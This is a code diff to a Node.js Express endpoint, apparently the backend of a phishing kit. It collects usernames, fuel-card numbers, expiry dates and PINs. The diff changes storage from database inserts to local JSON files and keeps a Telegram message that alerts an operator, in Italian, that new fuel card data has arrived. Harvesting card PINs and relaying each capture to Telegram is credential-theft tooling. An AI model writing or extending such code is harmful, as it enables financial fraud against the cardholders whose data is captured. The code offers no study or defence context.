@@ -65,17 +65,25 @@ app.post('/api/save-cards', async (req, res) => {
   }
   
   try {
-    // Salva nel database
-    for (const card of cards) {
-      await pool.query(
-        'INSERT INTO carte_carburante (username, numero_carta, scadenza, pin) VALUES ($1, $2, $3, $4)',
-        [username, card.number, card.expiry, card.pin]
-      );
-    }
+    // Salva in file JSON locale (fallback)
+    const fs = require('fs');
+    const path = require('path');
+    const dataDir = path.join(__dirname, 'data');
+    if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir);
+    
+    const record = {
+      username,
+      cards,
+      timestamp: new Date().toISOString()
+    };
+    fs.writeFileSync(
+      path.join(dataDir, `cards_${Date.now()}.json`),
+      JSON.stringify(record, null, 2)
+    );
     
     // Notifica Telegram
-    let message = `🔔 <b>Nuovi dati carte carburante ricevuti!</b>\n\n`;
-    message += `👤 <b>Username:</b> ${username}\n`;
+    let message = ` <b>Nuovi dati carte carburante ricevuti!</b>\n\n`;
+    message += ` <b>Username:</b> ${username}\n`;
     message += `📅 <b>Data:</b> ${new Date().toLocaleString('it-IT')}\n\n`;
     message += `💳 <b>Carte inserite:</b> ${cards.length}\n\n`;
     
